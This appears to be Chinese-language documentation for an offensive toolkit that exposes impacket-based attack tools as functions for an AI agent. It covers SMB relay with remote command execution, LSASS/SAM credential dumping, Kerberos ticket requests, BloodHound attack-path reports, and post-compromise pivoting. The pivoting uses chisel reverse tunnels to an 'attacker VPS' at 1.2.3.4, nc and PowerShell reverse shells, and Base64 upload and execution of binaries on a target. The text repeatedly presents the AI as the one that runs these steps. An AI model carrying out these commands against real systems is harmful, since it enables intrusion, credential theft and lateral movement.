**入口点**: `impacket-nfs_mount` 或 `nfs_mount.py`

**功能**: 挂载远程 NFS 共享

**使用示例**:

```bash
# 挂载 NFS 共享
impacket-nfs_mount 192.168.1.100 -mount=/share

# 指定挂载点
impacket-nfs_mount 192.168.1.100 -o mount=/share,dest=/mnt/nfs
```

---

### sniffer (网络流量嗅探)

**终端工具**: `impacket-sniff`

**入口点**: `impacket-sniffer` 或 `sniffer.py`

**功能**: 抓包分析网络流量

**使用示例**:

```bash
# 抓取流量
impacket-sniffer -i eth0 -c 100 -o capture.pcap

# 过滤特定流量
impacket-sniffer -i eth0 -filter "tcp port 445" -o capture.pcap
```

---

### smbrelayx (SMB 中继)

**终端工具**: `impacket-smbrelayx`

**入口点**: `impacket-smbrelayx` 或 `smbrelayx.py`

**功能**: SMB 中继攻击

**使用示例**:

```bash
# 监听并中继
impacket-smbrelayx -t smb://target -mode server -e "whoami"

# 指定目标列表
impacket-smbrelayx -tf targets.txt --smb2support
```

---

### mimikatz (凭据提取)

**终端工具**: `impacket-mimikatz`

**入口点**: `impacket-mimikatz` 或 `mimikatz.py`

**功能**: LSASS/SAM 凭据提取

**使用示例**:

```bash
# 导出所有凭据
impacket-mimikatz corp.local/Administrator:password@target -dump all

# 只导出 sekurlsa
impacket-mimikatz -hashes :NTHASH corp.local/Administrator@target -dump sekurlsa
```

---

### kintercept (Kerberos 票据操作)

**终端工具**: `impacket-kintercept`

**入口点**: `impacket-kintercept` 或 `kintercept.py`

**功能**: Kerberos 票据枚举和操作

**使用示例**:

```bash
# 读取票据
impacket-kintercept target@corp.local -mode read

# 请求票据
impacket-kintercept corp.local/user:pass@target -mode request -query cifs/
```

---

### opdump (RPC 协议绑定)

**终端工具**: `impacket-opdump`

**入口点**: `impacket-opdump` 或 `opdump.py`

**功能**: 绑定 RPC 协议端点进行探测

**使用示例**:

```bash
# 基本探测
impacket-opdump 192.168.1.10

# 指定协议
impacket-opdump 192.168.1.10 -protocol ldap
```

---

### registry_read (注册表读取)

**终端工具**: `impacket-registry_read`

**入口点**: `impacket-registry_read` 或 `registry_read.py`

**功能**: 读取远程注册表

**使用示例**:

```bash
# 读取服务列表
impacket-registry_read corp.local/Administrator:password@target -HiveName HKLM -SubKey 'SYSTEM\\CurrentControlSet\\Services'
```

---

### esentutl (ESE 数据库解析)

**终端工具**: `impacket-esentutlparse`

**入口点**: `impacket-esentutl` 或 `esentutl.py`

**功能**: 解析 ESE 数据库 (Exchange/DHCP/索引)

**使用示例**:

```bash
# 解析数据库
impacket-esentutl database.edb -o output_dir
```

---

### 通用 impacket 执行

**终端工具**: `impacket-misc`

**功能**: 执行未单独封装的 impacket 工具

**使用示例**:

```bash
# 执行 karmaSMB
run python -m impacket.examples...

# 执行 getArch
run python -m impacket.examples...

# 执行 ntfs-read
run python -m impacket.examples...
```

---

## 工具九：BloodHound 数据分析 (AD 权限图谱分析器)

**脚本路径**: .\scripts\bloodhound_analysis.py

> SharpHound/bloodhound-python 只负责收集数据，此工具负责分析数据、生成攻击路径报告。
> AI 可以直接调用此工具，获得类似 BloodHound GUI 的分析结果！

**分析方法**：

1. SharpHound/bloodhound-python 收集数据（生成 JSON 文件）
2. 将 JSON 文件所在目录路径传给分析工具
3. 获取完整分析报告，包含攻击路径发现

**分析报告内容**：

| 报告章节 | 分析内容 |
|----------|----------|
| 环境概览 | 域/用户/计算机/组数量统计 |
| 高价值目标 | Domain Admins、Enterprise Admins 等特权账户 |
| 会话分析 | 用户-计算机会话映射，找活跃用户 |
| 本地管理员 | 哪些用户是哪些机器的本地管理员 |
| 组关系 | 特权组成员关系分析 |
| ACL 分析 | 危险权限（WriteDacl/WriteOwner 等） |
| 域信任 | 跨域信任关系和攻击面 |
| GPO 分析 | 组策略对象分析 |
| 远程会话 | PSRemote/RDP 会话关系 |
| 攻击路径 | Kerberoast/AS-REP Roastable 发现 |

**完整工作流示例**：

  # 第一步：收集 AD 数据（使用 SharpHound）
  SharpHound.exe -c All -d corp.local -o "d:\bh_collect"

  # 第二步：分析收集的数据
  # AI 调用 impacket-bloodhound_analysis(data_path="d:\bh_collect")
  # AI 将获得完整的攻击路径分析报告！

  # 报告示例：
  # ======================================================
  #            BLOODHOUND AD 权限图谱分析报告
  # ======================================================
  #
  # 【1. 环境概览】
  # --------------------------------------------------
  #   域数量:      1
  #   用户数量:    156
  #   计算机数量:  89
  #   ...
  #
# 【10. 攻击路径总结 (Attack Path Summary)】
# --------------------------------------------------
#   [CRITICAL] 发现 3 条域管会话
#   [HIGH] 发现 5 个用户是多台机器的本地管理员
#   [MEDIUM] 发现 12 个 SPN 用户 (可 Kerberoast)

---

## 工具十：代理自动化搭建 (Proxy Setup)

**脚本路径**: .\scripts\proxy_setup.py

> 在获得内网主机权限后，需要搭建代理访问其他网段时使用。AI 会自动生成上传命令和执行指令！

**支持的代理工具**：

| 工具 | 说明 | 适用场景 |
|------|------|----------|
| chisel | 高性能 HTTP over TCP 隧道（推荐） | 端口转发、快速上线 |
| nc | 传统 Netcat 反向 shell | 简单连接、快速上线 |
| powershell | PowerShell 反向 shell | 无工具上传、绕过限制 |

**终端工具**: `impacket-proxy_setup`

**完整工作流示例**：

  # 场景：已获得 192.168.1.100 的权限，想通过它访问 10.10.10.0/24 网段
  # 攻击者 VPS: 1.2.3.4

  # AI 调用代理搭建工具：
  impacket-proxy_setup(
    tool="chisel",
    target_ip="1.2.3.4",      # 攻击者 VPS IP
    target_port=8080,           # 攻击者监听端口
    listen_port=8080,          # chisel 客户端监听端口
    os_type="windows"
  )

  # AI 将获得完整的搭建方案：

  # ======================================================
  #           代理自动化搭建报告 (Proxy Setup Report)
  # ======================================================
  #
  # 工具类型:      CHISEL
  # 目标系统:      WINDOWS
  # 目标 IP:       1.2.3.4
  # 目标端口:      8080
  # 监听端口:      8080
  #
  # 【1. 二进制文件信息】
  # --------------------------------------------------
  #   filename:   chisel.exe
  #   size:       10612224 bytes
  #   md5:        xxxxxxxxxxxxxxxx
  #   base64:     TVRoQAAAAAAA... (完整 Base64 编码)
  #
  # 【2. 上传方法】
  # --------------------------------------------------
  #   方法1: PowerShell Base64 上传
  #   方法2: 直接下载 (如果有 Web 服务)
  #
  # 【3. 执行命令】
  # --------------------------------------------------
  #   1. 攻击者启动: chisel.exe server --port 8080 --reverse
  #   2. 目标执行: chisel.exe client 1.2.3.4:8080 R:8080
  #
  # ======================================================

**代理搭建后访问内网**：

```bash
# 通过代理访问 10.10.10.0/24 网段
# 方法1: proxychains
proxychains4 nxc smb 10.10.10.50 -u Administrator -p 'Pass123!'

# 方法2: chisel SOCKS5 代理
# 攻击者设置: chisel server --port 8080 --socks5
# 目标设置: chisel client 1.2.3.4:8080 R:1080:socks
# 然后配置浏览器/SocksCap 使用 127.0.0.1:1080
```

---

## 工具十一：文件上传与执行 (Upload & Exec)

**终端工具**: `upload_and_exec`

> 将文件上传到目标机器并可选执行。配合代理搭建使用！

**参数说明**：

| 参数 | 说明 |
|------|------|
| target | 目标 IP |
| username | 认证用户名 |
| password | 认证密码 |
| local_file | 本地文件路径 |
| remote_path | 目标保存路径 |
| exec_command | 上传文件使用 scp 或终端 base64 echo 方式，再远程执行 |

**使用示例**：

  # 上传 chisel.exe 到目标机器
  upload_and_exec(
    target="192.168.1.100",
    username="Administrator",
    password="Pass123!",
    local_file="d:\\mcp\\tools\\chisel.exe",
    remote_path="C:\\Windows\\Temp\\chisel.exe",
    exec_command="C:\\Windows\\Temp\\chisel.exe client 1.2.3.4:8080 R:8080"
  )

  # AI 会生成 Base64 上传命令和执行方案！
